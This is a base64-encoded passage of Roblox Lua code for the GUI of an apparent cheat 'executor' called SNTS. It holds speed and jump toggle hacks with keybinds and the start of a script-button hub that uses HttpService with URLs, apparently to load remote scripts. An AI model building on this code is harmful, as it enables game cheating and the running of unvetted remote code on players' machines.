Z2V0Q29sb3IgPSBzcGVlZEVuYWJsZWQgYW5kIENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMTEyKSBvciBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KQogICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUodG9nZ2xlU3BlZWRGcmFtZSwgVHdlZW5JbmZvLm5ldygwLjI1KSwge0JhY2tncm91bmRDb2xvcjMgPSB0YXJnZXRDb2xvcn0pOlBsYXkoKQogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gdG9nZ2xlU3BlZWRTdGF0ZSgpCiAgICAgICAgc3BlZWRFbmFibGVkID0gbm90IHNwZWVkRW5hYmxlZAogICAgICAgIHVwZGF0ZVZpc3VhbCgpCgogICAgICAgIGlmIHNwZWVkRW5hYmxlZCB0aGVuCiAgICAgICAgICAgIHN0YXJ0U3BlZWQoKQogICAgICAgIGVsc2UKICAgICAgICAgICAgc3RvcFNwZWVkKCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHRvZ2dsZVNwZWVkS2V5YmluZC5BY3RpdmUgPSB0cnVlCiAgICB0b2dnbGVTcGVlZEtleWJpbmQuU2VsZWN0YWJsZSA9IHRydWUKICAgIHRvZ2dsZVNwZWVkS2V5YmluZC5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KICAgICAgICAgICAgd2FpdGluZ0ZvcktleSA9IHRydWUKICAgICAgICAgICAgdG9nZ2xlU3BlZWRLZXliaW5kLlRleHQgPSAiUHJlc3MgYSBLZXkuLi4iCiAgICAgICAgICAgIHRvZ2dsZVNwZWVkS2V5YmluZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCwgZ2FtZVByb2Nlc3NlZCkKICAgICAgICBpZiBnYW1lUHJvY2Vzc2VkIG9yIFVzZXJJbnB1dFNlcnZpY2U6R2V0Rm9jdXNlZFRleHRCb3goKSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgaWYgd2FpdGluZ0ZvcktleSBhbmQgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuS2V5Ym9hcmQgdGhlbgogICAgICAgICAgICB0b2dnbGVLZXkgPSBpbnB1dC5LZXlDb2RlCiAgICAgICAgICAgIHRvZ2dsZVNwZWVkS2V5YmluZC5UZXh0ID0gaW5wdXQuS2V5Q29kZS5OYW1lIG9yIHRvc3RyaW5nKGlucHV0LktleUNvZGUpCiAgICAgICAgICAgIHRvZ2dsZVNwZWVkS2V5YmluZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKICAgICAgICAgICAgd2FpdGluZ0ZvcktleSA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlIGFuZCBpbnB1dC5LZXlDb2RlID09IHRvZ2dsZUtleSB0aGVuCiAgICAgICAgICAgIHRvZ2dsZVNwZWVkU3RhdGUoKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIHRvZ2dsZVNwZWVkRnJhbWUuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBhbmQgbm90IHdhaXRpbmdGb3JLZXkgdGhlbgogICAgICAgICAgICB0b2dnbGVTcGVlZFN0YXRlKCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSB0YXNrLndhaXQoMikgZG8KICAgICAgICAgICAgaWYgbm90IHdhaXRpbmdGb3JLZXkgYW5kIHRvZ2dsZVNwZWVkS2V5YmluZCBhbmQgdG9nZ2xlU3BlZWRLZXliaW5kLlRleHQgfj0gKHRvZ2dsZUtleSBhbmQgdG9nZ2xlS2V5Lk5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIHRvZ2dsZUtleSA9IHRleHRUb0tleWNvZGUodG9nZ2xlU3BlZWRLZXliaW5kLlRleHQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQoKICAgIHVwZGF0ZVZpc3VhbCgpCmVuZAoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5TY3JvbGxpbmdGcmFtZS5TaG9ydGN1dDQKRzJMWyJmMSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiZTAiXSk7CkcyTFsiZjEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImYxIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbImYxIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyOTAsIDAsIDc1KTsKRzJMWyJmMSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImYxIl1bIk5hbWUiXSA9IFtbU2hvcnRjdXQ0XV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0NC5VSUNvcm5lcgpHMkxbImYyIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJmMSJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0NC5EaXZpZGVyCkcyTFsiZjMiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImYxIl0pOwpHMkxbImYzIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJmMyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJmMyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbImYzIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxLCAwLCAzMyk7CkcyTFsiZjMiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CkcyTFsiZjMiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJmMyJdWyJOYW1lIl0gPSBbW0RpdmlkZXJdXTsKRzJMWyJmMyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAwLjc7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0NC5TaG9ydGN1dDQKRzJMWyJmNCJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbImYxIl0pOwpHMkxbImY0Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJmNCJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiZjQiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyJmNCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJmNCJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbImY0Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDg2LCA4NiwgODYpOwpHMkxbImY0Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiZjQiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAsIDAuNSk7CkcyTFsiZjQiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE4NSwgMCwgNTApOwpHMkxbImY0Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZjQiXVsiVGV4dCJdID0gW1tUb2dnbGUgSnVtcF1dOwpHMkxbImY0Il1bIk5hbWUiXSA9IFtbU2hvcnRjdXQ0XV07CkcyTFsiZjQiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA0Njc4LCAwLCAwLjUsIDApOwoKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0NC5LZXliaW5kNApHMkxbImY1Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiZjEiXSk7CkcyTFsiZjUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImY1Il1bIlRleHRTaXplIl0gPSAxNzsKRzJMWyJmNSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJmNSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbImY1Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDg2LCA4NiwgODYpOwpHMkxbImY1Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiZjUiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAsIDAuNSk7CkcyTFsiZjUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEyOCwgMCwgNTApOwpHMkxbImY1Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZjUiXVsiVGV4dCJdID0gW1tKXV07CkcyTFsiZjUiXVsiTmFtZSJdID0gW1tLZXliaW5kNF1dOwpHMkxbImY1Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41MjY3OCwgMCwgMC41LCAwKTsKCi0tLy8gVG9nZ2xlIEp1bXAgKHdpdGggY29uZmlndXJhYmxlIGtleWJpbmQsIGRlZmF1bHQgSikKZG8KICAgIGxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQogICAgbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQoKICAgIGxvY2FsIHRvZ2dsZUp1bXBGcmFtZSA9IEcyTFsiZjEiXQogICAgbG9jYWwgdG9nZ2xlSnVtcExhYmVsID0gRzJMWyJmNCJdCiAgICBsb2NhbCB0b2dnbGVKdW1wS2V5YmluZCA9IEcyTFsiZjUiXQoKICAgIGxvY2FsIHdhaXRpbmdGb3JLZXkgPSBmYWxzZQogICAgbG9jYWwganVtcEVuYWJsZWQgPSBmYWxzZQoKICAgIGxvY2FsIGZ1bmN0aW9uIHRleHRUb0tleWNvZGUobmFtZSkKICAgICAgICBpZiBub3QgbmFtZSBvciBuYW1lID09ICIiIHRoZW4gcmV0dXJuIEVudW0uS2V5Q29kZS5KIGVuZAogICAgICAgIG5hbWUgPSB0b3N0cmluZyhuYW1lKTpnc3ViKCIlcysiLCAiIik6dXBwZXIoKQogICAgICAgIHJldHVybiBFbnVtLktleUNvZGVbbmFtZV0gb3IgRW51bS5LZXlDb2RlLkoKICAgIGVuZAoKICAgIGxvY2FsIHRvZ2dsZUtleSA9IHRleHRUb0tleWNvZGUodG9nZ2xlSnVtcEtleWJpbmQuVGV4dCkKCiAgICBsb2NhbCBmdW5jdGlvbiB1cGRhdGVWaXN1YWwoKQogICAgICAgIGxvY2FsIHRhcmdldENvbG9yID0ganVtcEVuYWJsZWQgYW5kIENvbG9yMy5mcm9tUkdCKDc1LCAwLCAxMzApIG9yIENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0b2dnbGVKdW1wRnJhbWUsIFR3ZWVuSW5mby5uZXcoMC4yNSksIHtCYWNrZ3JvdW5kQ29sb3IzID0gdGFyZ2V0Q29sb3J9KTpQbGF5KCkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHRvZ2dsZUp1bXBTdGF0ZSgpCiAgICAgICAganVtcEVuYWJsZWQgPSBub3QganVtcEVuYWJsZWQKICAgICAgICB1cGRhdGVWaXN1YWwoKQoKICAgICAgICBpZiBqdW1wRW5hYmxlZCB0aGVuCiAgICAgICAgICAgIHN0YXJ0SnVtcCgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBzdG9wSnVtcCgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICB0b2dnbGVKdW1wS2V5YmluZC5BY3RpdmUgPSB0cnVlCiAgICB0b2dnbGVKdW1wS2V5YmluZC5TZWxlY3RhYmxlID0gdHJ1ZQogICAgdG9nZ2xlSnVtcEtleWJpbmQuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCiAgICAgICAgICAgIHdhaXRpbmdGb3JLZXkgPSB0cnVlCiAgICAgICAgICAgIHRvZ2dsZUp1bXBLZXliaW5kLlRleHQgPSAiUHJlc3MgYSBLZXkuLi4iCiAgICAgICAgICAgIHRvZ2dsZUp1bXBLZXliaW5kLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4NiwgODYsIDg2KQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBnYW1lUHJvY2Vzc2VkKQogICAgICAgIGlmIGdhbWVQcm9jZXNzZWQgb3IgVXNlcklucHV0U2VydmljZTpHZXRGb2N1c2VkVGV4dEJveCgpIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBpZiB3YWl0aW5nRm9yS2V5IGFuZCBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCB0aGVuCiAgICAgICAgICAgIHRvZ2dsZUtleSA9IGlucHV0LktleUNvZGUKICAgICAgICAgICAgdG9nZ2xlSnVtcEtleWJpbmQuVGV4dCA9IGlucHV0LktleUNvZGUuTmFtZSBvciB0b3N0cmluZyhpbnB1dC5LZXlDb2RlKQogICAgICAgICAgICB0b2dnbGVKdW1wS2V5YmluZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKICAgICAgICAgICAgd2FpdGluZ0ZvcktleSA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlIGFuZCBpbnB1dC5LZXlDb2RlID09IHRvZ2dsZUtleSB0aGVuCiAgICAgICAgICAgIHRvZ2dsZUp1bXBTdGF0ZSgpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgdG9nZ2xlSnVtcEZyYW1lLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgYW5kIG5vdCB3YWl0aW5nRm9yS2V5IHRoZW4KICAgICAgICAgICAgdG9nZ2xlSnVtcFN0YXRlKCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSB0YXNrLndhaXQoMikgZG8KICAgICAgICAgICAgaWYgbm90IHdhaXRpbmdGb3JLZXkgYW5kIHRvZ2dsZUp1bXBLZXliaW5kIGFuZCB0b2dnbGVKdW1wS2V5YmluZC5UZXh0IH49ICh0b2dnbGVLZXkgYW5kIHRvZ2dsZUtleS5OYW1lKSB0aGVuCiAgICAgICAgICAgICAgICB0b2dnbGVLZXkgPSB0ZXh0VG9LZXljb2RlKHRvZ2dsZUp1bXBLZXliaW5kLlRleHQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQoKICAgIHVwZGF0ZVZpc3VhbCgpCmVuZAoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyJmNiJdID0gSW5zdGFuY2UubmV3KCJVSUFzcGVjdFJhdGlvQ29uc3RyYWludCIsIEcyTFsiZGQiXSk7CkcyTFsiZjYiXVsiQXNwZWN0UmF0aW8iXSA9IDAuNzU2NjU7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlVJU2NhbGUKRzJMWyJmNyJdID0gSW5zdGFuY2UubmV3KCJVSVNjYWxlIiwgRzJMWyJkZCJdKTsKCi0tIEF0dHJpYnV0ZXMKRzJMWyJmNyJdOlNldEF0dHJpYnV0ZShbW1Jlc29sdXRpb25dXSwgVmVjdG9yMi5uZXcoMTkxOSwgMTA4MCkpOwoKLS0gVGFncwpDb2xsZWN0aW9uU2VydmljZTpBZGRUYWcoRzJMWyJmNyJdLCBbW1VJU2NhbGVSdW50aW1lT2JqZWN0XV0pOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0CkcyTFsiZjgiXSA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgRzJMWyIxIl0pOwpHMkxbImY4Il1bIk5hbWUiXSA9IFtbU2NyaXB0XV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRApHMkxbImY5Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJmOCJdKTsKRzJMWyJmOSJdWyJWaXNpYmxlIl0gPSBmYWxzZTsKRzJMWyJmOSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZjkiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZjkiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMC41KTsKRzJMWyJmOSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTkxOSwgMCwgMTA4MCk7CkcyTFsiZjkiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CkcyTFsiZjkiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJmOSJdWyJOYW1lIl0gPSBbW0NNRF1dOwpHMkxbImY5Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5NYWluU2NyaXB0CkcyTFsiZmEiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiZjkiXSk7CkcyTFsiZmEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImZhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImZhIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly83OTc1ODE3OTc4NzMyNV1dOwpHMkxbImZhIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA1NDksIDAsIDQ4OCk7CkcyTFsiZmEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJmYSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbImZhIl1bIk5hbWUiXSA9IFtbTWFpblNjcmlwdF1dOwpHMkxbImZhIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wOTAwNiwgMCwgMC4wNjA0OSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5NYWluU2NyaXB0LkRpc3BsYXlOYW1lCkcyTFsiZmIiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyJmYSJdKTsKRzJMWyJmYiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZmIiXVsiVGV4dFNpemUiXSA9IDI1OwpHMkxbImZiIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImZiIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZmIiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZmIiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJmYiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwKTsKRzJMWyJmYiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiZmIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJmYiJdWyJUZXh0Il0gPSBbW01BSU4gU0NSSVBUXV07CkcyTFsiZmIiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbImZiIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELk1haW5TY3JpcHQuU2Nyb2xsaW5nRnJhbWUKRzJMWyJmYyJdID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIsIEcyTFsiZmEiXSk7CkcyTFsiZmMiXVsiQWN0aXZlIl0gPSB0cnVlOwpHMkxbImZjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJmYyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJmYyJdWyJTY3JvbGxCYXJJbWFnZVRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJmYyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbImZjIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NTEsIDAsIDM1Mik7CkcyTFsiZmMiXVsiU2Nyb2xsQmFySW1hZ2VDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI0MSwgMjQxLCAyNDEpOwpHMkxbImZjIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwpHMkxbImZjIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZmMiXVsiU2Nyb2xsQmFyVGhpY2tuZXNzIl0gPSA1OwpHMkxbImZjIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5NYWluU2NyaXB0LlNjcm9sbGluZ0ZyYW1lLlVJTGlzdExheW91dApHMkxbImZkIl0gPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIEcyTFsiZmMiXSk7CkcyTFsiZmQiXVsiSG9yaXpvbnRhbEFsaWdubWVudCJdID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyJmZCJdWyJQYWRkaW5nIl0gPSBVRGltLm5ldygwLCA2KTsKRzJMWyJmZCJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuTWFpblNjcmlwdC5VSUdyYWRpZW50CkcyTFsiMTBkIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbImZhIl0pOwpHMkxbIjEwZCJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbIjEwZCJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gQ29ubmVjdGVkIFNjcmlwdCBCdXR0b25zCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCmxvY2FsIEh0dHBTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCmxvY2FsIE1haW5GcmFtZSA9IEcyTFsiZmMiXSAtLSBSZWZlcmVuY2UgdG8gdGhlIFNjcm9sbGluZ0ZyYW1lIHdoZXJlIGJ1dHRvbnMgYXBwZWFyCgotLSBIZWxwZXIgdG8gY3JlYXRlIGJ1dHRvbnMKbG9jYWwgZnVuY3Rpb24gY3JlYXRlVUlCdXR0b24obmFtZSwgdXJsLCBpc0FkZG9uKQoJbG9jYWwgYnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKCWJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAsIDM2MCwgMCwgNDkpCglidXR0b24uQmFja2dyb3VuZENvbG9yMyA9IGlzQWRkb24gYW5kIENvbG9yMy5mcm9tUkdCKDYwLCAzMCwgMzApIG9yIENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpCglidXR0b24uQm9yZGVyU2l6ZVBpeGVsID0gMAoJYnV0dG9uLlRleHQgPSAiIgoJYnV0dG9uLlBhcmVudCA9IE1haW5GcmFtZQoKCWxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidXR0b24pCgoJbG9jYWwgbGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCglsYWJlbC5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQoJbGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCglsYWJlbC5TaXplID0gVURpbTIubmV3KDAsIDMwMCwgMCwgNDApCglsYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJbGFiZWwuVGV4dCA9IG5hbWUKCWxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAoJbGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCglsYWJl